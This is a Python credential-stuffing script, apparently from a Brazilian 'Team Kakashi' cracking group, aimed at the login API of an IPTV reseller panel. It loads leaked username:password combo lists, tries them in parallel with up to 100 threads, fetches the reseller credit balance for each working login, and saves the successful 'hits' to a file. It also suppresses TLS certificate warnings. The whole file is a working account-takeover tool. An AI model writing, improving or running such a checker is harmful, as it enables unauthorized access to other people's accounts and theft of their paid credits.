import requests
import json
import logging
import os
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

# Inicializa o colorama
init(autoreset=True)

# Configuração para evitar warnings de SSL
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
NAME = 'PAINEL CENTRAL'
sys.stdout.write(f"\033]2;{NAME}\007")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(Fore.CYAN + '''
     █▀▀ █▀▀ █▄░█ ▀█▀ █▀█ ▄▀█ █░░     
     █▄▄ ██▄ █░▀█ ░█░ █▀▄ █▀█ █▄▄     
       Cѳ∂¡gѳ Բ૯¡τѳ Pѳ૨ @MaxkakashiBr             
  ''')

# Inicializa contadores de Hits
hits_on = 0
hits_off = 0

# Função para limpar a tela e imprimir informações
def atualizar_tela(echo):
    sys.stdout.write("\033[H\033[J")  # Limpa a tela
    sys.stdout.write(echo)  # Imprime a nova saída
    sys.stdout.flush()  # Atualiza a saída

# Função para listar arquivos no diretório Combo
def listar_arquivos_combo():
    caminho = '/sdcard/Combo/'
    try:
        arquivos = os.listdir(caminho)
        if not arquivos:
            print("Nenhum arquivo encontrado na pasta Combo.")
            return None
        print(Fore.GREEN + "Selecione um arquivo de combo:")
        for idx, arquivo in enumerate(arquivos):
            print(Fore.RED + f"{idx + 1}: {arquivo}")
        return arquivos
    except Exception as e:
        print(f"Erro ao listar arquivos: {e}")
        return None

# Função para selecionar um arquivo de combo
def selecionar_arquivo_combo(arquivos):
    while True:
        try:
            escolha = int(input(Fore.GREEN + "Digite o número do combo desejado: ")) - 1
            if 0 <= escolha < len(arquivos):
                return arquivos[escolha]
            else:
                print("Número inválido. Tente novamente.")
        except ValueError:
            print("Entrada inválida. Por favor, insira um número.")

# Função para ler as credenciais do arquivo de combo
def ler_combo(arquivo):
    clear()  # Limpa a tela
    banner()  # Exibe o banner
    caminho = os.path.join('/sdcard/Combo/', arquivo)
    try:
        with open(caminho, 'r') as f:
            linhas = f.readlines()
            credenciais = []
            for linha in linhas:
                partes = linha.strip().split(':')
                if len(partes) == 2:  # Verifica se há exatamente 2 partes
                    credenciais.append((partes[0], partes[1]))  # Adiciona username e password à lista
            if not credenciais:
                print("Nenhuma credencial válida encontrada.")
                return None
            return credenciais  # Retorna todas as credenciais encontradas
    except Exception as e:
        print(f"Erro ao ler o arquivo de combo: {e}")
    return None

# Função para obter as credenciais
def obter_credenciais():
    arquivos = listar_arquivos_combo()
    if arquivos:
        arquivo_selecionado = selecionar_arquivo_combo(arquivos)
        credenciais = ler_combo(arquivo_selecionado)
        return credenciais
    return None

# Função para obter o nome do usuário
def obter_nome_usuario():
    clear()  # Limpa a tela
    banner()  # Exibe o banner
    nome_usuario = input(Fore.RED + "\nPor favor, insira seu nome \n\n\033[93m╰──➧ \033[92m ")
    return nome_usuario

# Função para mostrar informações de login
def print_login_info(username, password, xc_simbolic_credits):
    echo = (
        Fore.GREEN + "╔══[▐▐ 𝐏𝐀𝐈𝐍𝐄𝐋-𝐂𝐄𝐍𝐓𝐑𝐀𝐋▐▐ ]══\n" +
        Fore.GREEN + f"║∘CONFIG BY {nome}\n" +
        Fore.GREEN + "║∘PAINEL ➨ https://fsplayy.top\n" +
        Fore.GREEN + f"║∘USUARIO ➨ {username} \n" +
        Fore.GREEN + f"║∘SENHA ➨ {password} \n" +
        Fore.GREEN + f"║∘CRÉDITOS ➨ R$ {xc_simbolic_credits} \n" +
        Fore.GREEN + f"║∘HITS ON ➨ {hits_on} OFF ➨ {hits_off} \n" +
        Fore.GREEN + "╚══┃▐▐ ❝ 𝐓𝐞𝐚𝐦 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 ❞▐▐ ┃═══\n"
    )
    atualizar_tela(echo)

# Função para registrar logins inválidos
def registrar_login_invalido(username, password, status_code):
    global hits_off
    hits_off += 1  # Incrementa o contador de Hits OFF
    echo = (
        Fore.RED + "╔══[▐▐ 𝐏𝐀𝐈𝐍𝐄𝐋-𝐂𝐄𝐍𝐓𝐑𝐀𝐋▐▐ ]══\n" +
        Fore.RED + f"║∘CONFIG BY {nome}\n" +
        Fore.RED + "║∘PAINEL ➨ https://fsplayy.top\n" +
        Fore.RED + f"║∘USUARIO ➨ {username}\n" +
        Fore.RED + f"║∘SENHA ➨ {password}\n" +
        Fore.RED + f"║∘HITS ON ➨ {hits_on} OFF ➨ {hits_off} \n" +
        Fore.RED + f"║∘STATUS ➨ [{status_code}] \n" +
        Fore.RED + "╚══┃▐▐ ❝ 𝐓𝐞𝐚𝐦 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 ❞▐▐ ┃═══\n"
    )
    atualizar_tela(echo)

# Função para fazer login
def login(username, password):
    global hits_on
    headers = {
        "Host": "painel.centraliptv.net",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Referer": "https://fsplayy.top/application/authentication/login",
    }
    
    session = requests.Session()
    response_get = session.get("https://fsplayy.top/application/authentication/login", headers=headers)
    
    data = {
        'username': username,
        'password': password
    }
    
    response_post = session.post("https://fsplayy.top/api/authentication/login", headers=headers, data=data)
    
    if response_post.status_code == 200:
        response_data = response_post.json()
        if "token" in response_data:
            token = response_data["token"]
            xc_simbolic_credits = get_reseller_data(token)
            hits_on += 1  # Incrementa o contador de Hits ON
            print_login_info(username, password, xc_simbolic_credits)
            save_login_info(username, password, xc_simbolic_credits)
        else:
            registrar_login_invalido(username, password, response_post.status_code)
    else:
        registrar_login_invalido(username, password, response_post.status_code)

# Função para obter dados do reseller
def get_reseller_data(token):
    headers = {
        "Host": "painel.centraliptv.net",
        "Connection": "keep-alive",
        "X-CSRF-TOKEN": "t56SgTpMee3xu6slk9rAMBM2WTwiW76HU078CaNH",
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Referer": "https://fsplayy.top/application/home",
    }
    
    response = requests.get("https://fsplayy.top/api/reseller/data", headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        # Acessa o campo xc_simbolic_credits dentro da estrutura reseller
        return data.get("reseller", {}).get("xc_simbolic_credits", 0)
    else:
        print("Erro ao obter dados do reseller:", response.status_code)
        return 0

# Função para salvar informações de login em arquivo
def save_login_info(username, password, xc_simbolic_credits):
    with open("/sdcard/Hits/PAINEL[CENTRAL-IPTV].txt", "a") as file:
        file.write("╔══[▐▐ 𝐏𝐀𝐈𝐍𝐄𝐋-𝐂𝐄𝐍𝐓𝐑𝐀𝐋▐▐ ]══\n")
        file.write(f"║∘CONFIG BY {nome}\n")
        file.write("║∘PAINEL ➨ https://fsplayy.top\n")
        file.write(f"║∘USUARIO ➨ {username}\n")
        file.write(f"║∘SENHA ➨ {password}\n")
        file.write(f"║∘CRÉDITOS ➨ R$ {xc_simbolic_credits}\n")
        file.write("╚══┃▐▐ ❝ 𝐓𝐞𝐚𝐦 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 ❞▐▐ ┃═══\n\n")

# Função para obter o número de bots
def get_number_of_bots():
    clear()  # Limpa a tela
    banner()  # Exibe o banner
    while True:
        try:
            botnum = int(input("\033[91mDigite o número de bots (máximo 100):\n\n\033[93m╰──➧ \033[92m"))
            if 1 <= botnum <= 100:
                return botnum
            else:
                print("Número de bots deve estar entre 1 e 100.")
        except ValueError:
            print("Entrada inválida. Por favor, digite um número válido.")

# Função principal
def main():
    global nome
    nome = obter_nome_usuario()  # Chama a função para obter o nome do usuário

    # Obter o número de bots
    number_of_bots = get_number_of_bots()
    
    credenciais = obter_credenciais()
    if credenciais is None:
        print("Falha ao obter credenciais. O programa será encerrado.")
        exit(1)

    with ThreadPoolExecutor(max_workers=number_of_bots) as executor:  # Limita a quantidade de threads ao número de bots
        executor.map(lambda cred: login(*cred), credenciais)

    print(Fore.YELLOW + "\n\nS٨αทท૯๒ Cѳท૮ℓષ¡∂ѳ\n\nCѳ∂¡gѳ F૯¡τѳ Pѳ૨ Kαઝαઽђ¡ α L૯ท∂α")

if __name__ == "__main__":
    main()
